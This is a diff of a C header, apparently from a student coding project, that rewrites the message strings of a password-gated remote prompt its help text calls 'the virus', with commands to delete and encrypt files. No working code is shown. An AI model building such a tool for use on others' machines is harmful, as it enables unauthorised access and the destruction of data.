@@ -6,7 +6,7 @@
 /*   By: pboucher <pboucher@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2025/11/16 18:15:07 by mbatty            #+#    #+#             */
-/*   Updated: 2026/06/25 17:50:15 by pboucher         ###   ########.fr       */
+/*   Updated: 2026/07/22 03:39:46 by pboucher         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -33,9 +33,9 @@
 
 # define PROMPT "$Death 💣> "
 # define PASSWORD "Password 👑: "
-# define CONNECT_MSG "Totaly Accurate Battle Simulator! 🪖\n"
-# define CORRECT_PASS "Welcome to World Death 3 🧨! \n"
-# define INCORRECT_PASS "Im gonna bomb you 💥\n"
+# define CONNECT_MSG "I Am Inevitable 🫰\n"
+# define CORRECT_PASS "Now, I am become Death, the destroyer of worlds. ☠️\n"
+# define INCORRECT_PASS "Return to dust ☄️\n"
 # define COMMAND_HELP "All Commands:\n	\
 help: get all commands infos 🤯\n	\
 quit: close the virus 😱\n	\
@@ -49,7 +49,7 @@ decrypt <password> <file_path>: decrypt a file with the password 🤣\n"
 # define COMMAND_QUIT "Goodbye bro 😔\n"
 # define INVALID_COMMAND "Idk that command bro, try again 🤔\n"
 # define WRONG_DIR "Directory not found, try again 🐦‍🔥\n"
-# define BAD_DIR "Bad writting command or directory, try again 🎖️\n"
+# define BAD_DIR "Bad writting command or directory, try again 🕷️\n"
 # define BAD_DELETE "Failed to delete file ❎\n"
 # define FILE_EXIST "File already exist 🤪\n"
 # define GOOD_DELETE "Deleted File successfuly ✅\n"
@@ -57,8 +57,8 @@ decrypt <password> <file_path>: decrypt a file with the password 🤣\n"
 # define CHANGED_DIR "Moved to "
 # define GET_CWD "You are currently in "
 # define NO_CWD "WTF There is no CWD what are you doing 🥀\n"
-# define BAD_ENCRYPT "Bad writting command, try again ⚔️\n"
-# define BAD_PATH_CRYPT "Bad path for file, try again 🛡️\n"
+# define BAD_ENCRYPT "Bad writting command, try again ⚱️\n"
+# define BAD_PATH_CRYPT "Bad path for file, try again ⚰️\n"
 # define SUCCES_ENCRYPT "File successfuly encrypted/decrypted! 🥳\n"
 # define ALREADY_ENCRYPTED "File already encrypted! 🥴\n"
 # define BAD_FORMAT "Cannot decrypt file, bad format 🤧\n"
